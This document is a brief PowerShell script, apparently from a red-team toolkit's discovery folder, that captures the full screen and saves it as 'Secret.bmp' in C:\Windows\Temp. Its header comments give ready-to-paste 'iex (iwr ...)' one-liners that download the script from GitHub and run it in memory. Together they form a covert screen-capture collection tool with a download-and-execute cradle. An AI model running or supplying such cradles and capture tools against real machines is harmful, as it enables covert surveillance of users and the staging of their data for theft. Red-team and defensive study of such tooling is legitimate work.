#############################################################################
# Capturing a screenshot
# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy.ps1);
# OR
# Powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy.ps1);"
# Default Path/fileName: C:\Windows\Temp\Secret.bmp
#############################################################################
$File = "C:\Windows\Temp\Secret.bmp"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
# Gather Screen resolution information
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
# Create bitmap using the top-left and bottom-right bounds
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
# Create Graphics object
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
# Capture screen
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
# Save to file
$bitmap.Save($File) 
Write-Output "Screenshot saved to:"
Write-Output $File
#############################################################################
